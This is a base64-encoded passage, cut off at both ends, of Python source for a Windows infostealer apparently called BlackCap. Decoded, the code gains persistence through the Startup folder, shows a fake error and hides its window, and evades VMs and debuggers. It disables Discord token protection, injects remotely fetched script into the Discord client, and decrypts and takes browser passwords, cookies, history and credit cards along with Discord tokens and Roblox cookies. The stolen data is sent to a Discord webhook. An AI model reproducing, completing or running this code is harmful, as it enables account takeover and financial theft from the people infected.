iKQoKICAgICAgICBzZWxmLnBpbmdvbnJ1biA9IHNlbGYuZmV0Y2hfY29uZigicGluZyIpCiAgICAgICAgCiAgICAgICAgc2VsZi5iYXNldXJsID0gImh0dHBzOi8vZGlzY29yZC5jb20vYXBpL3Y5L3VzZXJzL0BtZSIKCiAgICAgICAgc2VsZi5zdGFydHVwZXhlID0gc2VsZi5mZXRjaF9jb25mKCJzdGFydHVwIikKICAgICAgICAKICAgICAgICBzZWxmLmZha2VfZXJyb3IgPSBzZWxmLmZldGNoX2NvbmYoImZha2VfZXJyb3IiKQoKICAgICAgICBzZWxmLmFwcGRhdGEgPSBvcy5nZXRlbnYoImxvY2FsYXBwZGF0YSIpCgogICAgICAgIHNlbGYucm9hbWluZyA9IG9zLmdldGVudigiYXBwZGF0YSIpCiAgICAgICAgCiAgICAgICAgc2VsZi5jaHJtbXVzZXJkdHQgPSBudHBhdGguam9pbihzZWxmLmFwcGRhdGEsICdHb29nbGUnLCAnQ2hyb21lJywgJ1VzZXIgRGF0YScpCgogICAgICAgIHNlbGYuZGlyLCBzZWxmLnRlbXAgPSBta2R0ZW1wKCksIGdldHRlbXBkaXIoKQoKICAgICAgICBpbmYsIG5ldCA9IHNlbGYuc3lzXzFmbygpLCBzZWxmLm5ldF8xZm8oKQoKICAgICAgICBzZWxmLnV1aWR3bmR6LCBzZWxmLncxbnYzciwgc2VsZi53MW5rMzN5ID0gaW5mWzBdLCBpbmZbMV0sIGluZlsyXQoKICAgICAgICBzZWxmLmlwLCBzZWxmLmNpdHksIHNlbGYuY291bnRyeSwgc2VsZi5yZWdpb24sIHNlbGYub3JnLCBzZWxmLmxvYywgc2VsZi5nb29nbGVtYXAgPSBuZXRbMF0sIG5ldFsxXSwgbmV0WzJdLCBuZXRbM10sIG5ldFs0XSwgbmV0WzVdLCBuZXRbNl0KCiAgICAgICAgc2VsZi5zcnR1cGwwYyA9IG50cGF0aC5qb2luKHNlbGYucm9hbWluZywgJ01pY3Jvc29mdCcsICdXaW5kb3dzJywgJ1N0YXJ0IE1lbnUnLCAnUHJvZ3JhbXMnLCAnU3RhcnR1cCcpCgogICAgICAgIHNlbGYucmVnZXhfd2ViaG9va19kc2MgPSAiYXBpL3dlYmhvb2tzIgoKICAgICAgICBzZWxmLmNocm1yZ3ggPSByZS5jb21waWxlKHInKF5wcm9maWxlXHNcZCopfGRlZmF1bHR8KGd1ZXN0IHByb2ZpbGUkKScsIHJlLklHTk9SRUNBU0UgfCByZS5NVUxUSUxJTkUpOwogICAgICAgIAogICAgICAgIHNlbGYuYmFzZXVybCA9ICJodHRwczovL2Rpc2NvcmQuY29tL2FwaS92OS91c2Vycy9AbWUiCgogICAgICAgIHNlbGYucmVnZXggPSBjbGVhcl9yZWcKCiAgICAgICAgc2VsZi5lbmNyeXB0ZWRfcmVnZXggPSByImRRdzR3OVdnWGNROlteXCJdKiIKCiAgICAgICAgc2VsZi50b2tlbnMgPSBbXQoKICAgICAgICBzZWxmLmJjX2lkID0gW10KCiAgICAgICAgc2VsZi5zZXAgPSBvcy5zZXA7CgogICAgICAgIHNlbGYucm9ibG94Y29va2llcyA9IFtdOwoKICAgICAgICBzZWxmLmNocm9tZV9rZXkgPSBzZWxmLmd0bWszeShudHBhdGguam9pbihzZWxmLmNocm1tdXNlcmR0dCwgIkxvY2FsIFN0YXRlIikpOwoKCiAgICAgICAgb3MubWFrZWRpcnMoc2VsZi5kaXIsIGV4aXN0X29rPVRydWUpOwoKCiAgICAKCgogICAgZGVmIGVycm9yX3JlbW90ZShzZWxmOiBzdHIpIC0+IHN0cjoKICAgICAgICBpZiBzZWxmLmZha2VfZXJyb3IgPT0gInllcyI6CiAgICAgICAgICAgIGN0eXBlcy53aW5kbGwudXNlcjMyLk1lc3NhZ2VCb3hXKE5vbmUsICdFcnJvciBjb2RlOiBXaW5kb3dzXzB4OTg4OTU4XG5Tb21ldGhpbmcgZ29uZSB3cm9uZy4nLCAnRmF0YWwgRXJyb3InLCAwKQoKICAgIGRlZiBwaW5nX29uX3J1bm5pbmcoc2VsZjogc3RyKSAtPiBzdHI6CiAgICAgICAgcGluZzEgPSB7CiAgICAgICAgICAgICdhdmF0YXJfdXJsJzogJ2h0dHBzOi8vcmF3LmdpdGh1YnVzZXJjb250ZW50LmNvbS9LU0NIZHNjL0JsYWNrQ2FwLUFzc2V0cy9tYWluL2JsYWNrY2FwJTIwKDIpLnBuZycsCiAgICAgICAgICAgICdjb250ZW50JzogIkBldmVyeW9uZSIKICAgICAgICAgICAgfQogICAgICAgIHBpbmcyID0gewogICAgICAgICAgICAnYXZhdGFyX3VybCc6ICdodHRwczovL3Jhdy5naXRodWJ1c2VyY29udGVudC5jb20vS1NDSGRzYy9CbGFja0NhcC1Bc3NldHMvbWFpbi9ibGFja2NhcCUyMCgyKS5wbmcnLAogICAgICAgICAgICAnY29udGVudCc6ICJAaGVyZSIKICAgICAgICAgICAgfQogICAgICAgIGlmIHNlbGYucGluZ29ucnVuID09ICJ5ZXMiOgogICAgICAgICAgICBpZiBzZWxmLnJlZ2V4X3dlYmhvb2tfZHNjIGluIHNlbGYuZGlzY29yZF93ZWJob29rOgogICAgICAgICAgICAgICAgaWYgc2VsZi5waW5ndHlwZSA9PSAiQGV2ZXJ5b25lIiBvciBzZWxmLnBpbmd0eXBlID09ICJldmVyeW9uZSI6CiAgICAgICAgICAgICAgICAgICAgaHR0cHgucG9zdChzZWxmLmRpc2NvcmRfd2ViaG9vaywganNvbj1waW5nMSkKICAgICAgICAgICAgaWYgc2VsZi5waW5ndHlwZSA9PSAiQGhlcmUiIG9yIHNlbGYucGluZ3R5cGUgPT0gImhlcmUiOgogICAgICAgICAgICAgICAgaWYgc2VsZi5yZWdleF93ZWJob29rX2RzYyBpbiBzZWxmLmRpc2NvcmRfd2ViaG9vayA6CiAgICAgICAgICAgICAgICAgICAgaHR0cHgucG9zdChzZWxmLmRpc2NvcmRfd2ViaG9vaywganNvbj1waW5nMikKCgoKICAgIGRlZiBzdGFydHVwYmxhY2tjYXAoc2VsZjogc3RyKSAtPiBzdHI6CiAgICAgICAgaWYgc2VsZi5zdGFydHVwZXhlID09ICJ5ZXMiOgogICAgICAgICAgICBzdGFydHVwX3BhdGggPSBvcy5nZXRlbnYoImFwcGRhdGEiKSArICJcXE1pY3Jvc29mdFxcV2luZG93c1xcU3RhcnQgTWVudVxcUHJvZ3JhbXNcXFN0YXJ0dXBcXCIKICAgICAgICAgICAgaWYgb3MucGF0aC5leGlzdHMoc3RhcnR1cF9wYXRoICsgYXJndlswXSk6CiAgICAgICAgICAgICAgICBvcy5yZW1vdmUoc3RhcnR1cF9wYXRoICsgYXJndlswXSkKICAgICAgICAgICAgICAgIGNvcHkyKGFyZ3ZbMF0sIHN0YXJ0dXBfcGF0aCkKICAgICAgICAgICAgZWxzZToKICAgICAgICAgICAgICAgIGNvcHkyKGFyZ3ZbMF0sIHN0YXJ0dXBfcGF0aCkKCgogICAgICAgICAgICAgICAgCiAgICBkZWYgaGlkZXRoaXMoc2VsZjogc3RyKSAtPiBzdHI6CiAgICAgICAgaWYgc2VsZi5oaWRlID09ICJ5ZXMiOgogICAgICAgICAgICBoaWRlID0gd2luMzJndWkuR2V0Rm9yZWdyb3VuZFdpbmRvdygpCiAgICAgICAgICAgIHdpbjMyZ3VpLlNob3dXaW5kb3coaGlkZSwgd2luMzJjb24uU1dfSElERSkKCgoKCiAgICBkZWYgYmNfZXhpdF90aGlzKHNlbGYpOgogICAgICAgIHNodXRpbC5ybXRyZWUoc2VsZi5kaXIsIGlnbm9yZV9lcnJvcnM9VHJ1ZSkKICAgICAgICBvcy5fZXhpdCgwKQoKICAgIGRlZiBleHRyYWN0X3RyeShmdW5jKToKICAgICAgICAnJydEZWNvcmF0b3IgdG8gc2FmZWx5IGNhdGNoIGFuZCBpZ25vcmUgZXhjZXB0aW9ucycnJwogICAgICAgIGRlZiB3cmFwcGVyKCphcmdzLCAqKmt3YXJncyk6CiAgICAgICAgICAgIHRyeToKICAgICAgICAgICAgICAgIGZ1bmMoKmFyZ3MsICoqa3dhcmdzKQogICAgICAgICAgICBleGNlcHQgRXhjZXB0aW9uOgogICAgICAgICAgICAgICAgcGFzcwogICAgICAgIHJldHVybiB3cmFwcGVyCgogICAgYXN5bmMgZGVmIGluaXQoc2VsZik6CiAgICAgICAgc2VsZi5icm93c2VycyA9IHsKICAgICAgICAgICAgJ2FtaWdvJzogc2VsZi5hcHBkYXRhICsgJ1xcQW1pZ29cXFVzZXIgRGF0YScsCiAgICAgICAgICAgICd0b3JjaCc6IHNlbGYuYXBwZGF0YSArICdcXFRvcmNoXFxVc2VyIERhdGEnLAogICAgICAgICAgICAna29tZXRhJzogc2VsZi5hcHBkYXRhICsgJ1xcS29tZXRhXFxVc2VyIERhdGEnLAogICAgICAgICAgICAnb3JiaXR1bSc6IHNlbGYuYXBwZGF0YSArICdcXE9yYml0dW1cXFVzZXIgRGF0YScsCiAgICAgICAgICAgICdjZW50LWJyb3dzZXInOiBzZWxmLmFwcGRhdGEgKyAnXFxDZW50QnJvd3NlclxcVXNlciBEYXRhJywKICAgICAgICAgICAgJzdzdGFyJzogc2VsZi5hcHBkYXRhICsgJ1xcN1N0YXJcXDdTdGFyXFxVc2VyIERhdGEnLAogICAgICAgICAgICAnc3B1dG5payc6IHNlbGYuYXBwZGF0YSArICdcXFNwdXRuaWtcXFNwdXRuaWtcXFVzZXIgRGF0YScsCiAgICAgICAgICAgICd2aXZhbGRpJzogc2VsZi5hcHBkYXRhICsgJ1xcVml2YWxkaVxcVXNlciBEYXRhJywKICAgICAgICAgICAgJ2dvb2dsZS1jaHJvbWUtc3hzJzogc2VsZi5hcHBkYXRhICsgJ1xcR29vZ2xlXFxDaHJvbWUgU3hTXFxVc2VyIERhdGEnLAogICAgICAgICAgICAnZ29vZ2xlLWNocm9tZSc6IHNlbGYuYXBwZGF0YSArICdcXEdvb2dsZVxcQ2hyb21lXFxVc2VyIERhdGEnLAogICAgICAgICAgICAnZXBpYy1wcml2YWN5LWJyb3dzZXInOiBzZWxmLmFwcGRhdGEgKyAnXFxFcGljIFByaXZhY3kgQnJvd3NlclxcVXNlciBEYXRhJywKICAgICAgICAgICAgJ21pY3Jvc29mdC1lZGdlJzogc2VsZi5hcHBkYXRhICsgJ1xcTWljcm9zb2Z0XFxFZGdlXFxVc2VyIERhdGEnLAogICAgICAgICAgICAndXJhbic6IHNlbGYuYXBwZGF0YSArICdcXHVDb3pNZWRpYVxcVXJhblxcVXNlciBEYXRhJywKICAgICAgICAgICAgJ3lhbmRleCc6IHNlbGYuYXBwZGF0YSArICdcXFlhbmRleFxcWWFuZGV4QnJvd3NlclxcVXNlciBEYXRhJywKICAgICAgICAgICAgJ2JyYXZlJzogc2VsZi5hcHBkYXRhICsgJ1xcQnJhdmVTb2Z0d2FyZVxcQnJhdmUtQnJvd3NlclxcVXNlciBEYXRhJywKICAgICAgICAgICAgJ2lyaWRpdW0nOiBzZWxmLmFwcGRhdGEgKyAnXFxJcmlkaXVtXFxVc2VyIERhdGEnLAogICAgICAgICAgICAnZWRnZSc6IHNlbGYuYXBwZGF0YSArICJcXE1pY3Jvc29mdFxcRWRnZVxcVXNlciBEYXRhIgoKICAgICAgICB9ICAgICAgICAKICAgICAgICBzZWxmLnByb2ZpbGVzID0gWwogICAgICAgICAgICAnRGVmYXVsdCcsCiAgICAgICAgICAgICdQcm9maWxlIDEnLAogICAgICAgICAgICAnUHJvZmlsZSAyJywKICAgICAgICAgICAgJ1Byb2ZpbGUgMycsCiAgICAgICAgICAgICdQcm9maWxlIDQnLAogICAgICAgICAgICAnUHJvZmlsZSA1JywKICAgICAgICBdCgogICAgICAgIGlmIHNlbGYuZGlzY29yZF93ZWJob29rID09ICIiIG9yIHNlbGYuZGlzY29yZF93ZWJob29rID09ICJceDU3RUJIT09LX0hFUkUiOgogICAgICAgICAgICBzZWxmLmJjX2V4aXRfdGhpcygpCiAgICAgICAgICAgIAogICAgICAgIHNlbGYuaGlkZXRoaXMoKQogICAgICAgIHNlbGYuZXJyb3JfcmVtb3RlKCkKICAgICAgICBzZWxmLnN0YXJ0dXBibGFja2NhcCgpCgogICAgICAgIGlmIHNlbGYuZmV0Y2hfY29uZignZGJ1Z2tpbGxlcicpIGFuZCBOb0RlYnVnZygpLmluVk0gaXMgVHJ1ZToKICAgICAgICAgICAgc2VsZi5iY19leGl0X3RoaXMoKQogICAgICAgIGF3YWl0IHNlbGYuYnlwYXNzX2J0dGRzYygpCiAgICAgICAgYXdhaXQgc2VsZi5ieXBhc3NfdG9rZW5wcnRjdCgpCgogICAgICAgIGZ1bmN0aW9uX2xpc3QgPSBbc2VsZi5zdGVhbF9zY3JlZW4sIHNlbGYuc3lzdGVtX2luZm9ybWF0aW9ucywgc2VsZi5zdGVhbF90b2tlbiwgc2VsZi5ncmFiYl9tYywgc2VsZi5ncmFiYl9yb2Jsb3hdCgoKICAgICAgICBpZiBzZWxmLmZldGNoX2NvbmYoJ2tpbGxfZGlzY29yZF9wcm9jZXNzJyk6CgogICAgICAgICAgICBhd2FpdCBzZWxmLmtpbGxfcHJvY2Vzc19pZCgpCgoKCiAgICAgICAgb3MubWFrZWRpcnMobnRwYXRoLmpvaW4oc2VsZi5kaXIsICdCcm93c2VycycpLCBleGlzdF9vaz1UcnVlKQogICAgICAgIGZvciBuYW1lLCBwYXRoIGluIHNlbGYuYnJvd3NlcnMuaXRlbXMoKToKICAgICAgICAgICAgaWYgbm90IG9zLnBhdGguaXNkaXIocGF0aCk6CiAgICAgICAgICAgICAgICBjb250aW51ZQoKICAgICAgICAgICAgc2VsZi5tYXN0ZXJrZXkgPSBzZWxmLmd0bWszeShwYXRoICsgJ1xcTG9jYWwgU3RhdGUnKQogICAgICAgICAgICBzZWxmLmZ1bmNzID0gWwogICAgICAgICAgICAgICAgc2VsZi5zdGVhbF9jb29raWVzMiwKICAgICAgICAgICAgICAgIHNlbGYuc3RlYWxfaGlzdG9yeTIsCiAgICAgICAgICAgICAgICBzZWxmLnN0ZWFsX3Bhc3N3b3JkczIsCiAgICAgICAgICAgICAgICBzZWxmLnN0ZWFsX2NjMgogICAgICAgICAgICBdCgogICAgICAgICAgICBmb3IgcHJvZmlsZSBpbiBzZWxmLnByb2ZpbGVzOgogICAgICAgICAgICAgICAgZm9yIGZ1bmMgaW4gc2VsZi5mdW5jczoKICAgICAgICAgICAgICAgICAgICB0cnk6CiAgICAgICAgICAgICAgICAgICAgICAgIGZ1bmMobmFtZSwgcGF0aCwgcHJvZmlsZSkKICAgICAgICAgICAgICAgICAgICBleGNlcHQ6CiAgICAgICAgICAgICAgICAgICAgICAgIHBhc3MKICAgICAgICAgICAgCiAgICAgICAgaWYgbnRwYXRoLmV4aXN0cyhzZWxmLmNocm1tdXNlcmR0dCkgYW5kIHNlbGYuY2hyb21lX2tleSBpcyBub3QgTm9uZToKICAgICAgICAgICAgb3MubWFrZWRpcnMobnRwYXRoLmpvaW4oc2VsZi5kaXIsICdHb29nbGUnKSwgZXhpc3Rfb2s9VHJ1ZSkKICAgICAgICAgICAgZnVuY3Rpb25fbGlzdC5leHRlbmQoW3NlbGYuc3RlYWxfcGFzc3dvcmRzLCBzZWxmLnN0ZWFsX2Nvb2tpZXMsIHNlbGYuc3RlYWxfaGlzdG9yeV0pCgogICAgICAgIGZvciBmdW5jIGluIGZ1bmN0aW9uX2xpc3Q6CiAgICAgICAgICAgIHByb2Nlc3MgPSB0aHJlYWRpbmcuVGhyZWFkKHRhcmdldD1mdW5jLCBkYWVtb249VHJ1ZSkKICAgICAgICAgICAgcHJvY2Vzcy5zdGFydCgpCiAgICAgICAgZm9yIHQgaW4gdGhyZWFkaW5nLmVudW1lcmF0ZSgpOgogICAgICAgICAgICB0cnk6CiAgICAgICAgICAgICAgICB0LmpvaW4oKQogICAgICAgICAgICBleGNlcHQgUnVudGltZUVycm9yOgogICAgICAgICAgICAgICAgY29udGludWUKICAgICAgICBzZWxmLm5hdGlmeV9tYXRjaGVkX3Rva2VucygpCiAgICAgICAgYXdhaXQgc2VsZi5faW5qZWN0X2Rpc2MoKQogICAgICAgIHNlbGYucGluZ19vbl9ydW5uaW5nKCkKICAgICAgICBzZWxmLmZpbmlzaGVkX2JjKCkKCiAgICAKCiAgICBhc3luYyBkZWYgX2luamVjdF9kaXNjKHNlbGYpOgogICAgICAgICMgVE8gRE86IHJlZHVjZSBjb2duZXRpdmUgY29tcGxleGl0eQogICAgICAgIGZvciBfZGlyIGluIG9zLmxpc3RkaXIoc2VsZi5hcHBkYXRhKToKCiAgICAgICAgICAgIGlmICdkaXNjb3JkJyBpbiBfZGlyLmxvd2VyKCk6CiAgICAgICAgICAgICAgICBkaXNjb3JkID0gc2VsZi5hcHBkYXRhICsgb3Muc2VwICsgX2RpcgogICAgICAgICAgICAgICAgZm9yIF9fZGlyIGluIG9zLmxpc3RkaXIobnRwYXRoLmFic3BhdGgoZGlzY29yZCkpOgoKICAgICAgICAgICAgICAgICAgICBpZiByZS5tYXRjaChyJ2FwcC0oXGQqXC5cZCopKicsIF9fZGlyKToKICAgICAgICAgICAgICAgICAgICAgICAgYXBwID0gbnRwYXRoLmFic3BhdGgobnRwYXRoLmpvaW4oZGlzY29yZCwgX19kaXIpKQogICAgICAgICAgICAgICAgICAgICAgICBtb2R1bGVzID0gbnRwYXRoLmpvaW4oYXBwLCAnbW9kdWxlcycpCgoKICAgICAgICAgICAgICAgICAgICAgICAgaWYgbm90IG50cGF0aC5leGlzdHMobW9kdWxlcyk6CiAgICAgICAgICAgICAgICAgICAgICAgICAgICByZXR1cm4KCgogICAgICAgICAgICAgICAgICAgICAgICBmb3IgX19fZGlyIGluIG9zLmxpc3RkaXIobW9kdWxlcyk6CgogICAgICAgICAgICAgICAgICAgICAgICAgICAgaWYgcmUubWF0Y2gociJkaXNjb3JkX2Rlc2t0b3BfY29yZS1cZCsiLCBfX19kaXIpOgogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGlual9wYXRoID0gbW9kdWxlcyArIG9zLnNlcCArIF9fX2RpciArIGYnXFxkaXNjb3JkX2Rlc2t0b3BfY29yZVxcJwoKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBpZiBudHBhdGguZXhpc3RzKGlual9wYXRoKToKCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGlmIHNlbGYuc3J0dXBsMGMgbm90IGluIGFyZ3ZbMF06CiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICB0cnk6CiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgb3MubWFrZWRpcnMoaW5qX3BhdGggKyAnYmxhY2tjYXAnLCBleGlzdF9vaz1UcnVlKQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgZXhjZXB0IFBlcm1pc3Npb25FcnJvcjoKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBwYXNzCgogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBpZiBzZWxmLnJlZ2V4X3dlYmhvb2tfZHNjIGluIHNlbGYuZGlzY29yZF93ZWJob29rOgogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBmID0gaHR0cHguZ2V0KHNlbGYuZmV0Y2hfY29uZignYmxhY2tjYXBfaW5qZWN0X3VybCcpKS50ZXh0LnJlcGxhY2UoIiVXRUJIT09LJSIsIHNlbGYuZGlzY29yZF93ZWJob29rKSMucmVwbGFjZSgiJW51bV9jb3JlX2Rpc2NvcmQlIiwgaW5qX3BhdGggKyAnaW5kZXguanMnKQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgdHJ5OgogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgd2l0aCBvcGVuKGlual9wYXRoICsgJ2luZGV4LmpzJywgJ3cnLCBlcnJvcnM9Imlnbm9yZSIpIGFzIGluZGV4RmlsZToKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBpbmRleEZpbGUud3JpdGUoZikKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgZXhjZXB0IFBlcm1pc3Npb25FcnJvcjoKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIHBhc3MKCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGlmIHNlbGYuZmV0Y2hfY29uZigna2lsbF9kaXNjb3JkX3Byb2Nlc3MnKToKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIG9zLnN0YXJ0ZmlsZShhcHAgKyBzZWxmLnNlcCArIF9kaXIgKyAnLmV4ZScpCgogICAgYXN5bmMgZGVmIGJ5cGFzc190b2tlbnBydGN0KHNlbGYpOgogICAgICAgIHRwID0gZiJ7c2VsZi5yb2FtaW5nfVxcRGlzY29yZFRva2VuUHJvdGVjdG9yXFwiCiAgICAgICAgaWYgbm90IG50cGF0aC5leGlzdHModHApOgogICAgICAgICAgICByZXR1cm4KICAgICAgICBjb25maWcgPSB0cCArICJjb25maWcuanNvbiIKCiAgICAgICAgZm9yIGkgaW4gWyJEaXNjb3JkVG9rZW5Qcm90ZWN0b3IuZXhlIiwgIlByb3RlY3Rpb25QYXlsb2FkLmRsbCIsICJzZWN1cmUuZGF0Il06CiAgICAgICAgICAgIHRyeToKICAgICAgICAgICAgICAgIG9zLnJlbW92ZSh0cCArIGkpCiAgICAgICAgICAgIGV4Y2VwdCBGaWxlTm90Rm91bmRFcnJvcjoKICAgICAgICAgICAgICAgIHBhc3MKICAgICAgICBpZiBudHBhdGguZXhpc3RzKGNvbmZpZyk6CiAgICAgICAgICAgIHdpdGggb3Blbihjb25maWcsIGVycm9ycz0iaWdub3JlIikgYXMgZjoKICAgICAgICAgICAgICAgIHRyeToKICAgICAgICAgICAgICAgICAgICBpdGVtID0ganNvbi5sb2FkKGYpCiAgICAgICAgICAgICAgICBleGNlcHQganNvbi5kZWNvZGVyLkpTT05EZWNvZGVFcnJvcjoKICAgICAgICAgICAgICAgICAgICByZXR1cm4KICAgICAgICAgICAgICAgIGl0ZW1bJ2tzY2hfaXNfaGVyZSddID0gImh0dHBzOi8vZ2l0aHViLmNvbS9LU0NIZHNjIgogICAgICAgICAgICAgICAgaXRlbVsnYXV0b19zdGFydCddID0gRmFsc2UKICAgICAgICAgICAgICAgIGl0ZW1bJ2F1dG9fc3RhcnRfZGlzY29yZCddID0gRmFsc2UKICAgICAgICAgICAgICAgIGl0ZW1bJ2ludGVncml0eSddID0gRmFsc2UKICAgICAgICAgICAgICAgIGl0ZW1bJ2ludGVncml0eV9hbGxvd2JldHRlcmRpc2NvcmQnXSA9IEZhbHNlCiAgICAgICAgICAgICAgICBpdGVtWydpbnRlZ3JpdHlfY2hlY2tleGVjdXRhYmxlJ10gPSBGYWxzZQogICAgICAgICAgICAgICAgaXRlbVsnaW50ZWdyaXR5X2NoZWNraGFzaCddID0gRmFsc2UKICAgICAgICAgICAgICAgIGl0ZW1bJ2ludGVncml0eV9jaGVja21vZHVsZSddID0gRmFsc2UKICAgICAgICAgICAgICAgIGl0ZW1bJ2ludGVncml0eV9jaGVja3NjcmlwdHMnXSA9IEZhbHNlCiAgICAgICAgICAgICAgICBpdGVtWydpbnRlZ3JpdHlfY2hlY2tyZXNvdXJjZSddID0gRmFsc2UKICAgICAgICAgICAgICAgIGl0ZW1bJ2ludGVncml0eV9yZWRvd25sb2FkaGFzaGVzJ10gPSBGYWxzZQogICAgICAgICAgICAgICAgaXRlbVsnaXRlcmF0aW9uc19pdiddID0gMzY0CiAgICAgICAgICAgICAgICBpdGVtWydpdGVyYXRpb25zX2tleSddID0gNDU3CiAgICAgICAgICAgICAgICBpdGVtWyd2ZXJzaW9uJ10gPSA2OTQyMAogICAgICAgICAgICB3aXRoIG9wZW4oY29uZmlnLCAndycpIGFzIGY6CiAgICAgICAgICAgICAgICBqc29uLmR1bXAoaXRlbSwgZiwgaW5kZW50PTIsIHNvcnRfa2V5cz1UcnVlKQogICAgICAgICAgICB3aXRoIG9wZW4oY29uZmlnLCAnYScpIGFzIGY6CiAgICAgICAgICAgICAgICBmLndyaXRlKCJcblxuLy9LU0NIX2lzX2hlcmUgfCBodHRwczovL2dpdGh1Yi5jb20vS1NDSGRzYyIpCgogICAgYXN5bmMgZGVmIGtpbGxfcHJvY2Vzc19pZChzZWxmKToKICAgICAgICBibGxpc3QgPSBzZWxmLmZldGNoX2NvbmYoJ2JscHJnZ2cnKQogICAgICAgIGZvciBpIGluIFsnZGlzY29yZCcsICdkaXNjb3JkdG9rZW5wcm90ZWN0b3InLCAnZGlzY29yZGNhbmFyeScsICdkaXNjb3JkZGV2ZWxvcG1lbnQnLCAnZGlzY29yZHB0YiddOgogICAgICAgICAgICBibGxpc3QuYXBwZW5kKGkpCiAgICAgICAgZm9yIHByb2MgaW4gcHN1dGlsLnByb2Nlc3NfaXRlcigpOgogICAgICAgICAgICBpZiBhbnkocHJvY3N0ciBpbiBwcm9jLm5hbWUoKS5sb3dlcigpIGZvciBwcm9jc3RyIGluIGJsbGlzdCk6CiAgICAgICAgICAgICAgICB0cnk6CiAgICAgICAgICAgICAgICAgICAgcHJvYy5raWxsKCkKICAgICAgICAgICAgICAgIGV4Y2VwdCAocHN1dGlsLk5vU3VjaFByb2Nlc3MsIHBzdXRpbC5BY2Nlc3NEZW5pZWQpOgogICAgICAgICAgICAgICAgICAgIHBhc3MKCgogICAgYXN5bmMgZGVmIGJ5cGFzc19idHRkc2Moc2VsZik6CiAgICAgICAgYmQgPSBzZWxmLnJvYW1pbmcgKyAiXFxCZXR0ZXJEaXNjb3JkXFxkYXRhXFxiZXR0ZXJkaXNjb3JkLmFzYXIiCiAgICAgICAgaWYgbnRwYXRoLmV4aXN0cyhiZCk6CiAgICAgICAgICAgIHggPSBzZWxmLnJlZ2V4X3dlYmhvb2tfZHNjCiAgICAgICAgICAgIHdpdGggb3BlbihiZCwgJ3InLCBlbmNvZGluZz0iY3A0MzciLCBlcnJvcnM9J2lnbm9yZScpIGFzIGY6CiAgICAgICAgICAgICAgICB0eHQgPSBmLnJlYWQoKQogICAgICAgICAgICAgICAgY29udGVudCA9IHR4dC5yZXBsYWNlKHgsICdLU0NIaXNoZXJlJykKICAgICAgICAgICAgd2l0aCBvcGVuKGJkLCAndycsIG5ld2xpbmU9JycsIGVuY29kaW5nPSJjcDQzNyIsIGVycm9ycz0naWdub3JlJykgYXMgZjoKICAgICAgICAgICAgICAgIGYud3JpdGUoY29udGVudCkKCiAgICBAZXh0cmFjdF90cnkKICAgIGRlZiBkZWNyeXB0X3ZhbChzZWxmLCBidWZmLCBtYXN0ZXJfa2V5KToKICAgICAgICB0cnk6CiAgICAgICAgICAgIGl2ID0gYnVmZlszOjE1XQogICAgICAgICAgICBwYXlsb2FkID0gYnVmZlsxNTpdCiAgICAgICAgICAgIGNpcGhlciA9IEFFUy5uZXcobWFzdGVyX2tleSwgQUVTLk1PREVfR0NNLCBpdikKICAgICAgICAgICAgZGVjcnlwdGVkX3Bhc3MgPSBjaXBoZXIuZGVjcnlwdChwYXlsb2FkKQogICAgICAgICAgICBkZWNyeXB0ZWRfcGFzcyA9IGRlY3J5cHRlZF9wYXNzWzotMTZdLmRlY29kZSgpCiAgICAgICAgICAgIHJldHVybiBkZWNyeXB0ZWRfcGFzcwogICAgICAgIGV4Y2VwdCBFeGNlcHRpb246CiAgICAgICAgICAgIHJldHVybiAiRmFpbGVkIHRvIGRlY3J5cHQgcGFzc3dvcmQiCgogICAgZGVmIGdldF9tYXN0ZXJfa2V5KHNlbGYsIHBhdGgpOgogICAgICAgIHdpdGggb3BlbihwYXRoLCAiciIsIGVuY29kaW5nPSJ1dGYtOCIpIGFzIGY6CiAgICAgICAgICAgIGMgPSBmLnJlYWQoKQogICAgICAgIGxvY2FsX3N0YXRlID0ganNvbi5sb2FkcyhjKQogICAgICAgIG1hc3Rlcl9rZXkgPSBiYXNlNjQuYjY0ZGVjb2RlKGxvY2FsX3N0YXRlWyJvc19jcnlwdCJdWyJlbmNyeXB0ZWRfa2V5Il0pCiAgICAgICAgbWFzdGVyX2tleSA9IG1hc3Rlcl9rZXlbNTpdCiAgICAgICAgbWFzdGVyX2tleSA9IENyeXB0VW5wcm90ZWN0RGF0YShtYXN0ZXJfa2V5LCBOb25lLCBOb25lLCBOb25lLCAwKVsxXQogICAgICAgIHJldHVybiBtYXN0ZXJfa2V5CgogICAgZGVmIHN0ZWFsX3Rva2VuKHNlbGYpOgogICAgICAgIHBhdGhzID0gewogICAgICAgICAgICAnRGlzY29yZCc6IHNlbGYucm9hbWluZyArICdcXGRpc2NvcmRcXExvY2FsIFN0b3JhZ2VcXGxldmVsZGJcXCcsCiAgICAgICAgICAgICdEaXNjb3JkIENhbmFyeSc6IHNlbGYucm9hbWluZyArICdcXGRpc2NvcmRjYW5hcnlcXExvY2FsIFN0b3JhZ2VcXGxldmVsZGJcXCcsCiAgICAgICAgICAgICdMaWdodGNvcmQnOiBzZWxmLnJvYW1pbmcgKyAnXFxMaWdodGNvcmRcXExvY2FsIFN0b3JhZ2VcXGxldmVsZGJcXCcsCiAgICAgICAgICAgICdEaXNjb3JkIFBUQic6IHNlbGYucm9hbWluZyArICdcXGRpc2NvcmRwdGJcXExvY2FsIFN0b3JhZ2VcXGxldmVsZGJcXCcsCiAgICAgICAgICAgICdPcGVyYSc6IHNlbGYucm9hbWluZyArICdcXE